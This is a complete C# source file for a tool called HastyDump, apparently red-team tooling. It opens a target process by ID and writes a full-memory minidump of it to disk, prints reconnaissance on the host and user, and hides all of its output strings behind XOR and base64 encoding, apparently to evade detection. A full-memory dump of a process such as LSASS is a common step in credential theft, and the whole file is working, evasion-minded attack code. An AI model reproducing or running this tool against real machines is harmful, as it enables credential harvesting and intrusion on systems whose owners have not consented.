using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

namespace HastyDump
{
    class Program
    {
        // PROCESS_INFORMATION struct 
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        // SYSTEM_HANDLE_TABLE_ENTRY_INFO struct 
        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
        {
            public ushort UniqueProcessId;
            public ushort CreatorBackTraceIndex;
            public char ObjectTypeIndex;
            public char HandleAttributes;
            public ushort HandleValue;
            public IntPtr Object;
            public ulong GrantedAccess;
        }

        // MINIDUMP_EXCEPTION_INFORMATION struct 
        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        public struct MINIDUMP_EXCEPTION_INFORMATION
        {
            public uint ThreadId;
            public IntPtr ExceptionPointers;
            public int ClientPointers;
        }

        // MINIDUMP_TYPE enum 
        public enum MINIDUMP_TYPE
        {
            MiniDumpNormal = 0x00000000,
            MiniDumpWithDataSegs = 0x00000001,
            MiniDumpWithFullMemory = 0x00000002,
            MiniDumpWithHandleData = 0x00000004,
            MiniDumpFilterMemory = 0x00000008,
            MiniDumpScanMemory = 0x00000010,
            MiniDumpWithUnloadedModules = 0x00000020,
            MiniDumpWithIndirectlyReferencedMemory = 0x00000040,
            MiniDumpFilterModulePaths = 0x00000080,
            MiniDumpWithProcessThreadData = 0x00000100,
            MiniDumpWithPrivateReadWriteMemory = 0x00000200,
            MiniDumpWithoutOptionalData = 0x00000400,
            MiniDumpWithFullMemoryInfo = 0x00000800,
            MiniDumpWithThreadInfo = 0x00001000,
            MiniDumpWithCodeSegs = 0x00002000
        }

        // ProcessAccessFlags enum
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        // import dbghelp.dll
        [DllImport("dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, Int32 ProcessId, IntPtr hFile, MINIDUMP_TYPE DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallackParam);

        // import Kernel32.dll
        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void CloseHandle(IntPtr handle);

        // import Kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("psapi.dll", SetLastError = true)]
        static extern uint GetProcessImageFileName(
            IntPtr hProcess,
            [Out] StringBuilder lpImageFileName,
            [In] [MarshalAs(UnmanagedType.U4)] int nSize
        );


        // https://stackoverflow.com/questions/14971836/xor-ing-strings-in-c-sharp
        private static string encryptDecrypt(string input)
        {
            char[] key = { 'K', 'S', 'A' }; // Any chars will work, in an array of any size
            char[] output = new char[input.Length];

            for (int i = 0; i < input.Length; i++)
            {
                output[i] = (char)(input[i] ^ key[i % key.Length]);
            }

            return new string(output);
        }

        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }

        static void Main(string[] args)
        {
            if (args.Count() < 2)
            {
                // No args passed show some help options
                // [*] Ussage: HastyDump.exe PROCCES_ID FULL_FILE_PATH
                Console.WriteLine(encryptDecrypt(Base64Decode("EHkcawYyODImLmlhAzIyPyoFPj4xZTY5LnMRGRwCCBYSFBoFaxUUBx8eDRoNDgwRCgcJ")));
                //    Example: HastyDump.exe 2182 'C:\\Users\\rt\\Desktop\\test.bin'
                Console.WriteLine(encryptDecrypt(Base64Decode("DisgJiMtLmlhAzIyPyoFPj4xZTY5LnNzemtza3QCcQ8dHiAkOSAdFyE1Fw8FLiAqPzwxFw81LiA1ZTEoJXQ=")));
                System.Environment.Exit(1);
            }
            IntPtr pHandle = IntPtr.Zero;
            bool retVal = false;
            int procId = int.Parse(args[0]);
            string dFile = args[1];
            StringBuilder procName = new StringBuilder(2000);
            FileStream fs = null;

            // print out setup
            // [*] RUNTIME TARGET CHECKS:
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine(encryptDecrypt(Base64Decode("EHkcawEUBQcIBhZhHxITDBYVaxAJDhAKGGk=")));
            // OperatingSystem Version:
            Console.WriteLine("\t" + encryptDecrypt(Base64Decode("BCMkOTI1Ij0mGCoyPzYsawUkOSAoJD17aw==")) + System.Environment.OSVersion);
            // Target MachineName: 
            Console.WriteLine("\t" + encryptDecrypt(Base64Decode("HzIzLDY1ax4gKDsoJTYPKj4kcXM=")) + System.Environment.MachineName);
            // Target DomainName:
            Console.WriteLine("\t" + encryptDecrypt(Base64Decode("HzIzLDY1axcuJjIoJR0gJjZ7aw==")) + System.Environment.UserDomainName);
            // Target UserName:
            Console.WriteLine("\t" + encryptDecrypt(Base64Decode("HzIzLDY1awYyLiEPKj4kcXM=")) + System.Environment.UserName);
            // Target Time Zone: 
            Console.WriteLine("\t" + encryptDecrypt(Base64Decode("HzIzLDY1awcoJjZhETwvLmlh")) + System.TimeZone.CurrentTimeZone.StandardName.ToString());
            // Target Time: 
            Console.WriteLine("\t" + encryptDecrypt(Base64Decode("HzIzLDY1awcoJjZ7aw==")) + DateTime.Now);
            // Target ProcessorCount: 
            Console.WriteLine("\t" + encryptDecrypt(Base64Decode("HzIzLDY1awMzJDAkOCAuORAuPj01cXM=")) + System.Environment.ProcessorCount);
            Console.ResetColor();

            // obtain process handle
            pHandle = OpenProcess(ProcessAccessFlags.QueryInformation | ProcessAccessFlags.VirtualMemoryRead, false, procId);
            if (pHandle.ToInt32() == 0)
            {
                // Throws error
                Console.ForegroundColor = ConsoleColor.Red;
                // Console.WriteLine("[!] FAIL: open process handle error code: " + Marshal.GetLastWin32Error().ToString());
                Console.WriteLine(encryptDecrypt(Base64Decode("EHIcaxUAAh97azwxLj1hOyEuKDYyOHMpKj0lJzZhLiEzJCFhKDwlLmlh")) + Marshal.GetLastWin32Error().ToString());
                Console.ResetColor();
                System.Environment.Exit(1);
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                // [*] SUCCESS: Obtained process image name
                Console.WriteLine(encryptDecrypt(Base64Decode("EHkcawAUCBAEGAB7axwjPzIoJTYlayMzJDAkOCBhIj4gLDZhJTIsLg==")));
                Console.ResetColor();

            }
            // now target image name
            if (GetProcessImageFileName(pHandle, procName, 2000) == 0)
            {
                // procname failed
                Console.ForegroundColor = ConsoleColor.Red;
                // [!] FAIL: Unable to obtain process name error: 
                Console.WriteLine(encryptDecrypt(Base64Decode("EHIcaxUAAh97awYvKjEtLnM1JHMuKScgIj1hOyEuKDYyOHMvKj4kcXM=")) + Marshal.GetLastWin32Error().ToString());
                Console.ResetColor();
            }
            else
            {
                // procname successfull
                Console.ForegroundColor = ConsoleColor.Green;
                // [*] SUCCESS: Obtained process image name
                Console.WriteLine(encryptDecrypt(Base64Decode("EHkcawAUCBAEGAB7axwjPzIoJTYlayMzJDAkOCBhIj4gLDZhJTIsLg==")));
                Console.ResetColor();
                // [*] INFO: target image: 
                Console.WriteLine(encryptDecrypt(Base64Decode("EHkcaxoPDRx7aycgOTQkP3MoJjImLmlh")) + procName);
            }
            // now dump process
            if (File.Exists(dFile))
            {
                // file already is present on the system.
                Console.ForegroundColor = ConsoleColor.Red;
                // [!] FAIL: Dump file is already present on system.. cleanup or force deletion
                Console.WriteLine(encryptDecrypt(Base64Decode("EHIcaxUAAh97axc0JiNhLTotLnMoOHMgJyEkKjc4ayMzLiAkJSdhJD1hOCoyPzYsZX1hKD8kKj00O3MuOXMnJCEiLnMlLj8kPzouJQ==")));
                // open and rewrite file
                fs = new FileStream(dFile, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
            }
            else
            {
                fs = new FileStream(dFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(encryptDecrypt(Base64Decode("EHkcawAUCBAEGAB7axAzLjI1Ij0mazUoJzZhOCczLjIsZDsgJTctLmlh")) + dFile);
                Console.ResetColor();
            }
            using (fs)
            {
                // allow constructor+deconstructor
                retVal = MiniDumpWriteDump(pHandle, procId, fs.SafeFileHandle.DangerousGetHandle(), MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                // [*] IMAGE TARGET DETAILS:
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine(encryptDecrypt(Base64Decode("EHkcaxoMChQEawcAGRQEH3MFDgcAAh8ScQ==")));
                // Image location: 
                Console.WriteLine("\t" + encryptDecrypt(Base64Decode("Aj4gLDZhODo7Lmlh")) + fs.Length / 1024 + " KB");
                Console.WriteLine("\t" + encryptDecrypt(Base64Decode("Aj4gLDZhJzwiKicoJD17aw==")) + Path.GetFullPath(dFile));
            }
        
            // Cleanup
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(encryptDecrypt(Base64Decode("EHkcaxoPDRx7axAtJCAkazUoJzZhIzIvLz8kazwncXM=")) + dFile);
            fs.Close();

            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(encryptDecrypt(Base64Decode("EHkcaxoPDRx7axAtJCAkayMzJDAkOCBhIzIvLz8kazwnayMzJDAkOCBhAhd7aw==")) + procId);
            CloseHandle(pHandle);
            Console.ReadKey();
        }
    }
}
